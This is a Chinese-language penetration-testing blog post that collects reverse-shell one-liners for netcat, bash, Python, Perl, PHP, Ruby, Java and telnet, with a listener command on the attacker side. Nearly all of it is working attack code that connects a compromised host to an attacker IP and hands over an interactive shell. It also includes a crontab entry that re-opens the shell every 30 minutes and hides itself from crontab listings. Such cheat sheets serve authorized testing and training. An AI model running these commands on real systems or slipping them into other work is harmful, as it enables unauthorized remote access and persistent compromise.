+++
date = "2016-08-06T08:36:53+08:00"
description = ""
draft = false
tags = ["elevate privileges"]
title = "反弹shell小结"
topics = ["Pentest"]

+++

当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令

### 0x00 Netcat
```
本地：nc -vv -l 8888
目标：nc -e cmd.exe 10.10.10.10 8888 #nc -e /bin/sh 10.10.10.10 8888
```

### 0x01 Bash
```
/bin/bash -i >& /dev/tcp/10.10.10.10/8888 0>&1
注：这个由解析shell的bash完成，有些时候不支持
```

### 0x02 crontab
```
下面这条命令执行后会每隔30分钟反弹一次：
(crontab -l;printf "*/30 * * * * exec 9<> /dev/tcp/10.10.10.10/8888;exec 0<&9;
exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|
crontab -
```

### 0x03 Python
```python
# 下面为1条命令
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,
socket.SOCK_STREAM);s.connect(("10.10.10.10",8888));os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### 0x04 Perl
```
# 下面为1条命令
perl -e 'use Socket;$i="10.10.10.10";$p=8888;socket(S,PF_INET,SOCK_STREAM,
getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,
">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### 0x05 PHP
```
php -r '$sock=fsockopen("10.10.10.10",8888);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### 0x06 Ruby
```
# 下面为1条命令
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",8888).to_i;
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### 0x07 Java
```
# 下面为3条命令
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/8888;cat <&5 | 
while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### 0x08 telnet
```
两种方法：
mknod backpipe p && telnet 173.214.173.151 8080 0backpipe
telnet 173.214.173.151 8080 | /bin/bash | telnet 173.214.173.151 8888
第一种hacker运行：nc -vlp 8080
第二种hacker运行：nc -vlp 8080和nc -vlp 8888
```

<br />
#### Reference(侵删)：
* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [https://www.91ri.org/6620.html](https://www.91ri.org/6620.html)
